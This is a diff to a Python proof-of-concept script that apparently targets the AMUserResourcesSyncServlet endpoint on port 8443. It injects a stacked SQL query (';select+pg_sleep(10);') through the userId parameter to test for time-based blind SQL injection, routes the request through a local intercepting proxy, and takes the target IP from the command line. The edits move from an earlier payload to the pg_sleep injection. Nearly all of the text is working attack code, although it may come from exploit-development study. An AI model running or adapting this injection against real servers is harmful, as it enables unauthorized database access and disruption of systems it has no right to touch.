@@ -12,15 +12,12 @@ def test_inject(ip):
     print('(+) Attempting to inject url')
 
     #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
-    url = "https://%s:8443/servlet/AMUserResourcesSyncServlet" % ip
+    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
+    print('url: {}'.format(url))
     #payload = '1;select+pg_sleep(100);'
-    payload = '1;'
-    params = {
-                "ForMasRange":"1",
-                "userId":payload
-            }
-
-    proxies = {'https':'https://127.0.0.1:8080'}
+    sqli = ';select+pg_sleep(10);'
+    params = 'ForMasRange={}&userId={}{}'.format('1', '1', sqli)
+    proxies = {'https':'http://127.0.0.1:8080'}
     r = requests.get(url, params=params, proxies=proxies, verify=False)
     print(r.text)
     print(r.headers)
@@ -59,8 +56,8 @@ def main():
     This is the main function
     """
     if len(sys.argv) != 2:
-        print('(+) usage: %s <target_ip> ' % sys.argv[0])
-        print('(+) e.g.: %s 192.168.137.113 ' % sys.argv[0])
+        print('(+) usage: {} <target_ip> '.format(sys.argv[0]))
+        print('(+) e.g.: {}192.168.137.113 '.format(sys.argv[0]))
         sys.exit(-1)
 
     ip = sys.argv[1]
